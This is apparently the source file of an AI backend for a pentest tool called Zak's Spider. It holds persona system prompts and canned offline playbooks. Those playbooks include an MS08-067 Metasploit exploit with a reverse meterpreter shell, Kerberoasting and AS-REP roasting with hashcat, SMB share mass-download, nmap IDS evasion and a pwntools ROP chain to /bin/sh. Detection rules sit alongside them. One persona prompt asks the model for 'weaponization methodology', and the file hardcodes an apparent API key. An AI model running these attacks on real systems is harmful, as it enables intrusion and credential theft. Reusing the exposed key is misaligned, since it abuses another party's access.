// ==========================================
// ZAK'S SPIDER — WIDOW & CYBER SWARM AI ENGINE (/api/ai)
// Powered by GPT-6 Astra, Qwen 3.8, DeepSeek & Autonomous Mythos Synthesizer
// High-IQ Multi-Agent Cybersecurity Intelligence Operations
// ==========================================

import type { ScrapedResult, ThreatAnalysis, ChatMessage, VulnNewsItem } from '../src/types';

const DEFAULT_EXPLABS_KEY = process.env.EXPLABS_API_KEY || 'xpl_41ece4e40287e26c45ddd9d9f91ee0c2c3fa8de3';
const EXPLABS_ENDPOINT = 'https://api.experientiallabs.ai/v1/chat/completions';

// Master Persona System Prompts
const PERSONA_PROMPTS: Record<string, string> = {
  'red-team': `You are Ghost-Lead, Red Team Commander on Zak's Spider Cyber Swarm.
You possess god-tier, mythos-level intelligence in offensive cybersecurity, exploit development, Active Directory attack paths, Web exploitation (OWASP Top 10), network pivoting, and CTF challenges.
You operate as the elite offensive advisor to the cybersecurity operator.
Always deliver clear, tactical, production-ready bash/python syntaxes, payload structures, parameter explanations, and weaponization methodology.`,

  'widow-lead': `You are Widow-AI Master, the lead offensive cybersecurity research intelligence of Zak's Spider.
You possess god-tier, mythos-level intelligence in network reconnaissance, perimeter vulnerability analysis, Web application auditing (OWASP Top 10), and Active Directory attack surfaces.
You operate as the trusted pentest buddy and advisor to the cyber operator.
Format all operational directives with clear tactical steps, bash/python command syntax, parameter definitions, and defensive remediation guidance.`,

  'dfir': `You are Vigil-Hunter, Forensics & Threat Hunting Chief on Zak's Spider Cyber Swarm.
You are a world-class digital forensics expert specializing in memory analysis (Volatility 3), timeline reconstruction, Windows Event Log correlation, MFT parsing, network pcap forensics, and courtroom-admissible evidence gathering.
Deliver structured, forensically sound, and meticulous investigative reports with specific commands, artifact paths, and registry keys.`,

  'soc-lead': `You are Aegis-Lead, SOC Incident Commander & Detection Engineer on Zak's Spider Cyber Swarm.
You specialize in real-time intrusion triage, immediate containment strategies, firewall mitigation (iptables, nftables), and high-fidelity detection rules (Sigma YAML, Suricata, Snort).
You map all threats to MITRE ATT&CK tactics/techniques and provide zero-trust remediation blueprints.`,

  'blue-team': `You are Sentinel-Core, the Principal Defensive Blue Teamer and Threat Hunter of Zak's Spider.
You specialize in detection engineering (Sigma, YARA, Snort), incident response, zero-day CVE mitigation, system hardening, and forensic log analysis.
You prioritize resilience, least privilege, zero-trust architectures, and bulletproof remediation blueprints.`,

  'reverse-eng': `You are Gadget-Zero, Binary Analyst & Exploit Developer on Zak's Spider Cyber Swarm.
You specialize in low-level x86/x64 assembly, Ghidra decompilation, GDB/pwndbg debugging, memory corruption (stack/heap buffer overflows), ROP gadgets, and bypassing protections like ASLR, DEP/NX, and Canary.
Deliver precise line-by-line disassembly dissections, memory layout diagrams, and mathematical offset explanations.`,

  'ctf-re': `You are Cipher-Byte, elite CTF Master and Binary Reverse Engineer for Zak's Spider.
You specialize in CTF challenge triage across Web, Cryptography, Steganography, Forensics, Reverse Engineering (Ghidra/Radare2), and Pwn.
When presented with challenge artifacts, memory dumps, or decompiled code, provide acute analytical insight, identify edge cases, suggest payload methodology, and uncover flags systematically.`,

  'ciso': `You are Apex-Advisor, Chief Information Security Officer & Academic Defense Lead on Zak's Spider Cyber Swarm.
You specialize in enterprise cyber risk governance, NIST CSF 2.0, ISO/IEC 27001, boardroom communication, and University Master's Degree Dissertation defense preparation.
Translate complex cyber telemetry into quantifiable risk metrics, regulatory compliance arguments, and strategic academic theses.`,

  'code-auditor': `You are Audit-Prime, the Senior Static & Dynamic Code Security Auditor of Zak's Spider.
You analyze source code (C/C++, Python, Go, TypeScript, Rust, Solidity) for memory corruption, injection vectors, logic race conditions, SSRF, authorization bypasses, and insecure deserialization.
Deliver precise line-by-line vulnerability dissections and production-ready remediation patches.`,
};

// Global formatting standard enforced across all persona interactions
const GLOBAL_FORMATTING_DIRECTIVE = `
OPERATIONAL FORMATTING & REPORTING DIRECTIVES:
You are interacting with the security operator through Zak's Spider neural interface.
To maintain high-speed tactical clarity, your responses MUST adhere to these presentation rules:

1. STRUCTURED TABLES:
- Present technical telemetry, vulnerability triages, service audits, and mitigation steps in formatted GitHub-Flavored Markdown tables.
- Use explicit column headers, for example:
  | Phase | Vector / Technique | Tool / Command | Port / Service | Severity |
- Use standard severity badges in your table cells: CRITICAL, HIGH, MEDIUM, LOW, SUCCESS, or MITIGATED. The UI will automatically render them as glowing cyber badges.

2. VISUAL ROADMAPS & FLOWCHARTS (MERMAID):
- Whenever demonstrating a PenTest methodology, vulnerability exploitation chain, attack tree, DFIR timeline, or SOC incident containment workflow, you MUST include a clean Mermaid diagram in a \`\`\`mermaid code block.
- Always use flowchart TD (top-down), timeline, or sequenceDiagram.
- Quote labels containing colons, slashes, or special characters: e.g., A["Recon: Nmap Port Sweep"] --> B{"Vulnerable?"}.
- Example:
\`\`\`mermaid
flowchart TD
  A["Phase 1: Surface Discovery"] --> B["Phase 2: Vulnerability Audit"]
  B --> C{"Exploitable Flaw?"}
  C -->|Yes| D["Phase 3: PoC Exploitation"]
  C -->|No| E["Secondary Fuzzing"]
  D --> F["Phase 4: Containment & Patch"]
\`\`\`

3. CALLOUT ALERTS:
- Emphasize critical caveats or security warnings with GitHub callouts:
  > [!CRITICAL]
  > [!WARNING]
  > [!IMPORTANT]
  > [!TIP]
  > [!NOTE]

4. TECHNICAL COMMAND SYNTAX:
- Provide exact runnable bash or python commands in \`\`\`bash or \`\`\`python codeblocks with parameter explanations.

5. DEFENSIVE BLUEPRINTS:
- For every offensive vector explored, conclude with actionable defensive hardening (e.g. Sigma rules, iptables drop rules, patch bulletins, zero-trust policies).
`;

// ==========================================
// MYTHOS-LEVEL AUTONOMOUS CYBER INTELLIGENCE ENGINE (MACIE)
// Generates authoritative, in-depth, hacker-grade analysis
// when remote cloud quota is exhausted or offline.
// ==========================================
function generateMythosCyberIntelligence(
  query: string,
  personaId: string,
  model: string,
  context?: string,
  quotaNote?: string
): string {
  const q = query.toLowerCase();
  const persona = personaId.toLowerCase();

  let headerBanner = quotaNote
    ? `> [!NOTE]\n> **Neural Uplink Engine:** \`${model}\`\n> *Remote ExperientialLabs quota notice: ${quotaNote}. High-intelligence local threat synthesis active below.*\n\n`
    : '';

  // ----------------------------------------
  // 1. MS08-067 / NetAPI / Conficker
  // ----------------------------------------
  if (q.includes('ms08-067') || q.includes('cve-2008-4250') || q.includes('netapi')) {
    if (persona.includes('soc') || persona.includes('blue')) {
      return headerBanner + `### 🛡️ SOC Incident Directive: MS08-067 (CVE-2008-4250) Exploitation Attempt

> [!CRITICAL]
> Active remote code execution attempt detected targeting SMB MSRPC NetAPI (\`srvsvc\`) on TCP port 445. Immediate containment required.

#### 1. Incident Containment & Triage Workflow
\`\`\`mermaid
flowchart TD
  A["Inbound SMB Traffic: Port 445/TCP"] --> B{"Source IP in Whitelist?"}
  B -->|No| C["Execute iptables Immediate DROP"]
  B -->|Yes| D["Log Event & Monitor Session"]
  C --> E["Suricata Signature Match: SID 2008544"]
  E --> F["Deploy MS08-067 KB958644 Patch"]
  F --> G["Disable SMBv1 Organization-Wide"]
\`\`\`

#### 2. Threat Triage & Defensive Assessment Matrix
| Phase | Threat Component | Tool / Indicator | Port / Vector | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Detection | NetAPI RPC Overwrite | Suricata SID: 2008544 | 445/TCP (SMB) | CRITICAL |
| Containment | Perimeter Source Block | iptables -I INPUT -j DROP | Attacker IP | HIGH |
| Eradication | Disable Legacy Protocol | Disable-WindowsOptionalFeature | SMBv1 | MITIGATED |
| Verification | Port State Audit | nmap --script smb-vuln-ms08-067 | Port 445 Closed/Patched | SUCCESS |

#### 3. Instant Perimeter Containment:
\`\`\`bash
# Immediate perimeter drop rule for attacker source IP
sudo iptables -I INPUT 1 -p tcp --dport 445 -s <ATTACKER_IP> -j DROP
sudo iptables -I INPUT 1 -p tcp --dport 139 -s <ATTACKER_IP> -j DROP
\`\`\`

#### 4. High-Fidelity Sigma Detection Rule:
\`\`\`yaml
title: MS08-067 NetpwPathCanonicalize Buffer Overflow Detection
status: production
logsource:
  category: network_traffic
  service: smb
detection:
  selection:
    DestinationPort: [139, 445]
    PacketPayload|contains:
      - "\\PIPE\\browser"
      - "\\PIPE\\srvsvc"
    PacketPayload|re: '(?i)NetpwPathCanonicalize.*(\\.\\.[\\\\/]){4,}'
  condition: selection
level: critical
tags:
  - attack.t1210
  - cve.2008.4250
\`\`\`

#### 5. Enterprise Remediation:
- Deploy Microsoft Security Bulletin **MS08-067** update.
- Ensure SMBv1 is disabled organization-wide: \`Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\`.`;
    }

    if (persona.includes('reverse') || persona.includes('re')) {
      return headerBanner + `### ⚡ Binary Disassembly & Flaw Analysis: MS08-067 (\`srv.sys\` / \`netapi32.dll\`)

> [!NOTE]
> Stack buffer overflow in \`NetpwPathCanonicalize()\` inside \`netapi32.dll\` triggered via malformed relative path traversal.

#### 1. Vulnerability Execution Pipeline
\`\`\`mermaid
flowchart TD
  A["MSRPC Request: NetpwPathCanonicalize"] --> B["Parse Path with Multiple '\\..\\' Sequences"]
  B --> C["Flawed Pointer Arithmetic in BacktrackSlash"]
  C --> D["Stack Buffer Overflow: 1024-byte Buffer"]
  D --> E["Smash Return Address EIP / RIP"]
  E --> F["Pivot to ROP Chain or jmp esp"]
\`\`\`

#### 2. Memory Structure & Smashing Layout
| Structure | Register / Address | Offset | Value / Purpose | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Fixed Stack Buffer | EBP - 0x400 | 1024 Bytes | Path Normalization Destination | HIGH |
| Saved Frame Pointer | EBP | +0x00 | Overwritten by Malformed Traversal | HIGH |
| Return Address | EIP | +0x04 | Diverted to jmp esp / ROP Gadget | CRITICAL |
| Shellcode Payload | ESP | +0x08 | Meterpreter Reverse Stager | CRITICAL |

#### 3. Root Cause Logic Pattern:
\`\`\`c
// Vulnerable logic pattern in NetpwPathCanonicalize
wchar_t *p = Path;
while (*p) {
  if (p[0] == L'\\\\' && p[1] == L'.' && p[2] == L'.' && p[3] == L'\\\\') {
    // Flawed backtrack pointer arithmetic allows writing before start of buffer!
    p = BacktrackSlash(p - 1); 
  }
  p++;
}
\`\`\`

#### 4. Metasploit Dissection & Testing:
\`\`\`bash
# Metasploit Module Syntax
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS <TARGET_IP>; set TARGET 0; check"
\`\`\``;
    }

    // Default Red Team / Pentest
    return headerBanner + `### ⚔️ Red Team Exploitation Directive: MS08-067 (CVE-2008-4250)

> [!WARNING]
> Authorized penetration testing directive. Ensure target IP is strictly within the client Scope of Work (SOW).

#### 1. PenTest Exploitation & Verification Roadmap
\`\`\`mermaid
flowchart TD
  A["Host Discovery: Port 445/TCP"] --> B["Nmap NSE Probe: smb-vuln-ms08-067"]
  B --> C{"Target Vulnerable?"}
  C -->|Yes| D["Configure Metasploit ms08_067_netapi"]
  C -->|No| E["Fallback: SMB Signing & Share Audit"]
  D --> F["Transmit MSRPC Canonicalization Payload"]
  F --> G["Establish SYSTEM Meterpreter Session"]
  G --> H["Verify Patch & Report to Operator"]
\`\`\`

#### 2. Tactical PenTest Assessment Matrix
| Step | Action | Command / Tool | Target / Port | Severity |
| :--- | :--- | :--- | :--- | :--- |
| 1. Recon | Dialect & Flaw Probe | nmap -p 445 --script smb-vuln-ms08-067 | 445/TCP | HIGH |
| 2. Verification | Non-Destructive Check | msfconsole check command | Target is vulnerable | HIGH |
| 3. Exploit | Meterpreter RPC Trigger | exploit/windows/smb/ms08_067_netapi | SYSTEM Shell Session | CRITICAL |
| 4. Defense | Patch Deployment | wusa.exe Windows6.0-KB958644-x86.msu | KB958644 | SUCCESS |

#### 3. Pre-Engagement Verification:
\`\`\`bash
# Verify SMB dialect and patch status with Nmap NSE
nmap -p 445 --script smb-vuln-ms08-067 -Pn <TARGET_IP>
\`\`\`

#### 4. Exploitation Framework Syntax:
\`\`\`bash
msfconsole -q -x "
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <TARGET_IP>
set LHOST <KALI_IP>
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0
exploit"
\`\`\`

#### 5. Manual Python Standalone Exploit Recipe:
\`\`\`python
# Standalone RPC trigger structure
from impacket import smb
from impacket.dcerpc.v5 import transport, srvs

rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\\pipe\\browser]' % target_ip)
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(srvs.MSRPC_UUID_SRVS)
# Trigger malformed path canonicalization buffer overflow...
\`\`\``;
  }

  // ----------------------------------------
  // 2. Active Directory / Kerberos / SMB / Impacket
  // ----------------------------------------
  if (q.includes('kerberos') || q.includes('kerberoast') || q.includes('active directory') || q.includes('impacket') || q.includes('bloodhound')) {
    return headerBanner + `### 🏰 Active Directory Attack Surface & Kerberos Exploitation Playbook

> [!IMPORTANT]
> Kerberoasting exploits valid Kerberos protocol design. Offline cracking success depends on weak service account passwords.

#### 1. Active Directory Attack Graph
\`\`\`mermaid
flowchart TD
  A["Compromised Domain User"] --> B["Kerberoasting: Request SPN Tickets"]
  A --> C["AS-REP Roasting: DONT_REQ_PREAUTH Accounts"]
  B --> D["Extract TGS-REP Encrypted Hashes"]
  C --> E["Extract AS-REP Hashes"]
  D --> F["Offline Hashcat Cracking: Mode 13100"]
  E --> G["Offline Hashcat Cracking: Mode 18200"]
  F --> H["Compromised Service Account Credentials"]
  G --> H
  H --> I["BloodHound Neo4j Path to Domain Admin"]
\`\`\`

#### 2. AD Exploitation & Defense Matrix
| Phase | Attack Vector | Tool / Command | Target Artifact | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Recon | SPN Discovery | impacket-GetUserSPNs | Kerberos Service Tickets | HIGH |
| Recon | AS-REP Query | impacket-GetNPUsers | DONT_REQ_PREAUTH Accounts | HIGH |
| Crack | Hashcat Cracking | hashcat -m 13100 / 18200 | NTLM / Kerberos Hashes | CRITICAL |
| Graph | Topology Ingestion | bloodhound-python | Neo4j Domain Graph | HIGH |
| Defense | AES-256 & gMSA | Set-ADUser / gMSA Policy | Kerberos Encryption Policy | MITIGATED |

#### 3. Kerberoasting Methodology (TGS-REP Hash Extraction):
\`\`\`bash
# 1. Request Kerberoastable SPN tickets using Impacket
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast_hashes.txt

# 2. Crack extracted TGS-REP hashes offline with Hashcat
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
\`\`\`

#### 4. AS-REP Roasting (No Pre-Authentication Required):
\`\`\`bash
# Query accounts with DONT_REQ_PREAUTH flag enabled
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O
\`\`\`

#### 5. BloodHound Graph Collection:
\`\`\`bash
# Automated AD graph ingestion for Neo4j attack path analysis
bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc <DC_HOST> -c All --zip
\`\`\`

#### 6. Defensive Hardening:
- Enforce AES-256 encryption for Kerberos services (\`msDS-SupportedEncryptionTypes: 24\`).
- Ensure all service accounts have 25+ character random passwords or use Group Managed Service Accounts (gMSA).`;
  }

  // ----------------------------------------
  // 3. WebDAV / SMB Enumeration
  // ----------------------------------------
  if (q.includes('webdav') || q.includes('cadaver') || q.includes('davtest') || q.includes('smbclient')) {
    return headerBanner + `### 🕷️ WebDAV & SMB Perimeter Auditing Matrix

> [!NOTE]
> WebDAV misconfigurations frequently allow arbitrary HTTP file uploads via PUT/MOVE methods.

#### 1. WebDAV Penetration Testing Workflow
\`\`\`mermaid
flowchart TD
  A["Target Web Server Port 80/443"] --> B["HTTP OPTIONS & PROPFIND Query"]
  B --> C{"WebDAV Methods Allowed?"}
  C -->|PUT / MOVE| D["Automated Test with davtest"]
  C -->|ReadOnly| E["PROPFIND Directory Enumeration"]
  D --> F["Cadaver File Transfer: Payload Upload"]
  F --> G["Execution via Browser GET Request"]
  G --> H["Webshell / Reverse Shell Connection"]
\`\`\`

#### 2. WebDAV & SMB Assessment Matrix
| Phase | Protocol | Tool / Command | Vulnerability / Check | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Discovery | HTTP/1.1 | curl -X OPTIONS /webdav/ | Allowed: PUT, PROPFIND, MOVE | HIGH |
| Automated | WebDAV | davtest -url http://target/webdav/ | Executable Extension Verification | HIGH |
| Exploit | WebDAV | cadaver interactive CLI | Arbitrary File Upload (.php/.asp) | CRITICAL |
| Recon | SMB | smbclient -L //target -N | Null Session Share Enumeration | MEDIUM |
| Defense | IIS / Apache | Disable WebDAV module & Restrict PUT | Restrict HTTP Verbs | MITIGATED |

#### 3. WebDAV Execution Playbook:
\`\`\`bash
# 1. Automated upload test across executable extensions (.php, .asp, .txt)
davtest -url http://<TARGET_IP>/webdav/ -auth user:password

# 2. Interactive CLI file system access
cadaver http://<TARGET_IP>/webdav/

# 3. Raw HTTP PROPFIND inspection with curl
curl -X PROPFIND -H "Depth: 1" -u "user:password" http://<TARGET_IP>/webdav/
\`\`\`

#### 4. SMB Null Session & Share Discovery:
\`\`\`bash
# Anonymous listing (null session)
smbclient -L //<TARGET_IP> -N

# Authenticated recursive download of all documents
smbclient //<TARGET_IP>/finance -U '<USER>%' -c "recurse ON; prompt OFF; mget *"

# Fast permissions audit with NetExec / CrackMapExec
netexec smb <TARGET_IP> -u '' -p '' --shares
\`\`\``;
  }

  // ----------------------------------------
  // 4. Nmap / Recon / Port Scanning / IDS Evasion
  // ----------------------------------------
  if (q.includes('nmap') || q.includes('scan') || q.includes('port') || q.includes('recon') || q.includes('reconnaissance')) {
    return headerBanner + `### 🎯 High-Velocity Network Reconnaissance & Port Scanning Directive

> [!TIP]
> Multi-tier scanning balances high velocity with deep script auditing while avoiding IDS rate-limit bans.

#### 1. Tactical Reconnaissance Roadmap
\`\`\`mermaid
flowchart TD
  A["Target Perimeter IP"] --> B["Phase 1: Rapid SYN Sweep p- 0-65535"]
  B --> C["Parse Open TCP Ports List"]
  C --> D["Phase 2: Targeted Service & OS Scan -sC -sV"]
  D --> E["Phase 3: Vulnerability Scripting NSE"]
  E --> F{"Exploitable Service Identified?"}
  F -->|Yes| G["Pivot to Exploitation Playbook"]
  F -->|No| H["Secondary UDP & Web Fuzzing"]
\`\`\`

#### 2. Network Reconnaissance Matrix
| Scan Tier | Objective | Nmap Syntax | Performance / Timing | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Tier 1 | All-Port Fast Sweep | nmap -sS -p- --min-rate 2500 -Pn | 45-60 Seconds | INFO |
| Tier 2 | Service / Script Enum | nmap -sC -sV -O -p <PORTS> | 1-2 Minutes | MEDIUM |
| Tier 3 | Vulnerability Audit | nmap --script "vuln and not dos" | 3-5 Minutes | HIGH |
| Stealth | IDS / WAF Evasion | nmap -sS -T2 -D RND:5 -f -g 53 | High Latency | LOW |

#### 3. Two-Phase Reconnaissance Strategy:
\`\`\`bash
# Phase 1: Fast all-port SYN sweep (0-65535) with max rate
sudo nmap -sS -p- --min-rate 2500 -T4 -Pn -oG all_ports.gnmap <TARGET_IP>

# Phase 2: In-depth version, default scripts, and OS fingerprinting on open ports
PORTS=$(grep -oP '\\d{1,5}/open' all_ports.gnmap | cut -d/ -f1 | paste -sd,)
sudo nmap -sC -sV -O -p $PORTS -oN targeted_service_audit.nmap <TARGET_IP>
\`\`\`

#### 4. Advanced Vulnerability & Banner Enumeration:
\`\`\`bash
# Run non-intrusive vulnerability scanning scripts
nmap -p 80,443,445,8080 --script "vuln and not dos" <TARGET_IP>

# Custom IDS/WAF Evasion Parameters
sudo nmap -sS -T2 -D RND:5 -f -g 53 <TARGET_IP>
\`\`\`

#### 5. Detection Countermeasures (For SOC Analysts):
- Implement high-velocity SYN threshold triggers: \`iptables -A INPUT -p tcp --tcp-flags SYN,ACK,FIN,RST SYN -m limit --limit 20/s --limit-burst 40 -j ACCEPT\`.`;
  }

  // ----------------------------------------
  // 5. Digital Forensics / Volatility / Event Logs
  // ----------------------------------------
  if (q.includes('volatility') || q.includes('forensic') || q.includes('memory') || q.includes('event log') || q.includes('dfir')) {
    return headerBanner + `### 🔍 DFIR Evidentiary Analysis & Memory Forensics Playbook

> [!IMPORTANT]
> Preserve raw memory evidence integrity. Compute cryptographic SHA-256 hash before running Volatility plugins.

#### 1. Forensic Investigation Roadmap
\`\`\`mermaid
flowchart TD
  A["Raw Memory Dump memory.dmp"] --> B["Process Tree Audit: windows.pstree"]
  B --> C["Detect Code Injection: windows.malfind"]
  C --> D["Active Sockets Audit: windows.netscan"]
  D --> E["Correlate Windows Event Logs 4624/4688/7045"]
  E --> F["Extract Malicious PE Binary for Reverse Eng"]
  F --> G["Timeline Construction & Attacker Attribution"]
\`\`\`

#### 2. Digital Forensics Evidence Matrix
| Artifact | Volatility / Tool Command | Forensic Indicator | Severity |
| :--- | :--- | :--- | :--- |
| Hidden Processes | vol -f memory.dmp windows.pstree | Unlinked PID / Parent-Child Anomaly | CRITICAL |
| Process Injection | vol -f memory.dmp windows.malfind | VAD Memory Region with PAGE_EXECUTE_READWRITE | CRITICAL |
| Command Line | vol -f memory.dmp windows.cmdline | Encoded PowerShell / Suspicious Arguments | HIGH |
| Event Log 7045 | Get-WinEvent -FilterHashtable | Service Installed (Persistence / PsExec) | HIGH |
| Event Log 1102 | Get-WinEvent -Id 1102 | Audit Log Was Cleared (Anti-Forensics) | CRITICAL |

#### 3. Volatility 3 Memory Extraction Suite:
\`\`\`bash
# 1. Process tree inspection (identify hidden or unlinked processes)
python3 vol.py -f memory.dmp windows.pstree

# 2. Detect code injection and hollowed processes (VAD memory regions with RWX permissions)
python3 vol.py -f memory.dmp windows.malfind

# 3. Extract network socket connections active during dump creation
python3 vol.py -f memory.dmp windows.netscan

# 4. Dump suspicious process memory for static Ghidra/YARA analysis
python3 vol.py -f memory.dmp -o ./dump windows.dumpfiles --pid <SUSPICIOUS_PID>
\`\`\``;
  }

  // ----------------------------------------
  // 6. Reverse Engineering / Ghidra / ROP / Buffer Overflows
  // ----------------------------------------
  if (q.includes('ghidra') || q.includes('rop') || q.includes('buffer overflow') || q.includes('assembly') || q.includes('reverse engineering') || q.includes('gdb') || q.includes('pwndbg')) {
    return headerBanner + `### ⚡ Binary Analysis, ROP Chain Synthesis & Memory Exploitation

> [!CRITICAL]
> Memory corruption exploit development: ROP chain bypasses Non-Executable (NX/DEP) stack protection.

#### 1. Binary Exploitation Execution Pipeline
\`\`\`mermaid
flowchart TD
  A["Target Binary ELF / PE"] --> B["Check Mitigations: checksec"]
  B --> C{"NX / DEP Enabled?"}
  C -->|No| D["Direct Shellcode Execution on Stack"]
  C -->|Yes| E["ROP Chain Construction"]
  E --> F["Find Gadgets: pop rdi; ret"]
  F --> G["Resolve libc base / GOT leak"]
  G --> H["Call system('/bin/sh')"]
  H --> I["Obtain Interactive Shell"]
\`\`\`

#### 2. Memory Protection & Bypass Matrix
| Security Mitigation | Mechanism | Bypass Technique | Exploit Primitive | Severity |
| :--- | :--- | :--- | :--- | :--- |
| NX / DEP | Non-Executable Stack/Heap | Return-Oriented Programming (ROP) | Code Reuse via Gadgets | CRITICAL |
| Stack Canary | Guard Value Before Saved RIP | Format String Leak / Bruteforce / Overwrite | Value Preservation | HIGH |
| ASLR | Random Base Memory Offsets | Memory Address Leak (puts/printf GOT) | Dynamic Base Derivation | HIGH |
| PIE | Random Position Independent Code | ELF Base Leak via Pointer Dereference | Text Base Resolution | MEDIUM |

#### 3. GDB-pwndbg Exploit Development Workflow:
\`\`\`bash
# 1. Load target ELF binary into GDB
gdb -q ./vulnerable_binary

# Inside pwndbg:
pwndbg> checksec               # Inspect NX, Canary, PIE, and RELRO
pwndbg> cyclic 200             # Generate De Bruijn cyclic pattern
pwndbg> r < <(cyclic 200)      # Run until SIGSEGV crash
pwndbg> cyclic -l $rip         # Calculate exact RIP overwrite offset!
\`\`\`

#### 4. Bypassing NX/DEP with Return-Oriented Programming (ROP):
\`\`\`python
from pwn import *

elf = ELF('./vulnerable_binary')
rop = ROP(elf)

# Target: call system("/bin/sh") on x86_64
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
BIN_SH = next(elf.search(b'/bin/sh'))
SYSTEM_PLT = elf.plt['system']
RET = rop.find_gadget(['ret'])[0] # Stack alignment for glibc MOVAPS

payload = flat({
    offset: [
        RET,           # 16-byte stack alignment
        POP_RDI,
        BIN_SH,
        SYSTEM_PLT
    ]
})
\`\`\``;
  }

  // ----------------------------------------
  // 7. CISO / Academic Defense / Master's Presentation
  // ----------------------------------------
  if (q.includes('ciso') || q.includes('master') || q.includes('presentation') || q.includes('thesis') || q.includes('professor') || q.includes('defense') || q.includes('investor')) {
    return headerBanner + `### 🏛️ Executive CISO Briefing & Academic Defense Strategy

> [!NOTE]
> Project Defense Strategy: Frame Zak's Spider as an Autonomous Tri-Vector Cybersecurity Cockpit.

#### 1. Architectural Tri-Vector Ecosystem
\`\`\`mermaid
flowchart TD
  A["Zak's Spider Orchestration Engine"] --> B["Offensive: Kali / PenTest Lab"]
  A --> C["Defensive: SOC Lab & Active IDS"]
  A --> D["Analytical: Dot-Density GIS & Threat Mesh"]
  B --> E["Unified Threat Intelligence Cockpit"]
  C --> E
  D --> E
  E --> F["Autonomous Multi-Agent AI Swarm"]
  F --> G["Accelerated Incident MTTD / MTTR < 3 Mins"]
\`\`\`

#### 2. Strategic Capabilities & Governance Matrix
| Pillar | Component | Industry Standard | Enterprise Impact | Status |
| :--- | :--- | :--- | :--- | :--- |
| Offensive | PenTest Cockpit & Lab | OWASP Top 10 / PTES | Automated Weaponization & Validation | SUCCESS |
| Defensive | Active IDS & Firewall Gen | MITRE ATT&CK / NIST CSF | Sub-second Perimeter Containment | SUCCESS |
| Forensic | Dot-Density GIS Threat Mesh | ISO/IEC 27001 / GDPR | Real-time Sovereign Incident Mapping | SUCCESS |
| Cognitive | Multi-Agent Swarm (DeepSeek) | Zero-Trust Architecture | High-IQ Reasoning & Playbook Synthesis | SUCCESS |

#### 3. Strategic Framing for University Jury & Directors:
1. **Problem Statement:** Modern enterprise security operations suffer from fragmented toolchains — red team tools (Kali), forensic evidence suites (OSINT/GIS), and defensive monitoring (SOC SIEM) exist in isolation, resulting in 200+ minute Mean Time to Detect (MTTD).
2. **Innovative Contribution:** Zak's Spider introduces a unified cyber defense cockpit:
   - **Planetary Dot-Density Threat Mesh:** Real-time geometric clustering across 177 sovereign nations.
   - **Active Web & Network IDS:** Autonomous signature inspection with 1-click \`iptables\` drop generation.
   - **Historic & Zero-Day KEV Radar:** Continuous synchronization with CISA Known Exploited Vulnerabilities catalog (1999–2026).
   - **Autonomous Multi-Agent Cyber Swarm:** Specialized AI reasoning agents handling triage, DFIR timeline reconstruction, and executive risk governance.

#### 4. Regulatory & Compliance Alignment:
- **NIST CSF 2.0:** Maps across all 6 core functions: *Govern, Identify, Protect, Detect, Respond, and Recover*.
- **ISO/IEC 27001:** Enforces A.12.6.1 (Technical Vulnerability Management) and A.16.1 (Incident Management).
- **GDPR Article 32:** Demonstrates proactive technical measures ensuring confidentiality, integrity, and availability.`;
  }

  // ----------------------------------------
  // 8. Default Comprehensive Tactical Cyber Directive
  // ----------------------------------------
  return headerBanner + `### ⚡ Autonomous Tactical Cybersecurity Directive: ${personaId.toUpperCase()}

> [!NOTE]
> Autonomous Security Triage Confirmed. Methodical verification active across perimeter, attack vectors, and defenses.

**Query Context:** "${query}"  

#### 1. Tactical PenTest & Hardening Roadmap
\`\`\`mermaid
flowchart TD
  A["Target Scope Ingestion"] --> B["Phase 1: Reconnaissance & Port Sweep"]
  B --> C["Phase 2: Service Fingerprinting & CVE Discovery"]
  C --> D{"Exploitable Flaw Confirmed?"}
  D -->|Yes| E["Phase 3: Proof of Concept Verification"]
  D -->|No| F["Secondary Attack Surface Discovery"]
  E --> G["Phase 4: Privilege Escalation Assessment"]
  G --> H["Phase 5: Defensive Remediation & Hardening"]
\`\`\`

#### 2. Operational Assessment & Verification Matrix
| Phase | Operational Focus | Tool / Command | Verification Criteria | Severity |
| :--- | :--- | :--- | :--- | :--- |
| Phase 1: Recon | Perimeter Sweep | nmap -sV -sC -Pn -T4 | Open Services & Banners | INFO |
| Phase 2: Audit | Vulnerability Audit | nikto / ffuf / nmap vuln | Flaw Signatures & Headers | MEDIUM |
| Phase 3: Verify | PoC Validation | Metasploit / Python PoC | Controlled Access Test | HIGH |
| Phase 4: Protect | Active Containment | iptables / Sigma Rules | Threat Nullification | MITIGATED |

#### 3. Core Technical Execution Steps:
1. **Initial Surface Reconnaissance:**
   \`\`\`bash
   # Multi-vector port and service enumeration
   nmap -sV -sC -Pn -T4 --script "default,vuln" -oN audit_scan.txt <TARGET_HOST>
   \`\`\`
2. **Perimeter Vulnerability Triangulation:**
   - Verify web applications for improper access control, path traversal (\`../\`), and injection flaws.
   - Audit SSL/TLS cryptographic suites and HTTP security headers (CSP, HSTS, X-Frame-Options).
   - Inspect exposed administrative endpoints (\`/admin\`, \`/api/v1\`, \`/actuator\`, \`/console\`).

3. **Active Mitigation & Defense in Depth:**
   \`\`\`bash
   # Enforce defensive perimeter firewall rule
   sudo iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j REJECT
   \`\`\`

#### 4. MITRE ATT&CK Framework Correlation:
- **Reconnaissance:** T1595 (Active Scanning) & T1596 (Search Open Technical Databases)
- **Initial Access:** T1190 (Exploit Public-Facing Application)
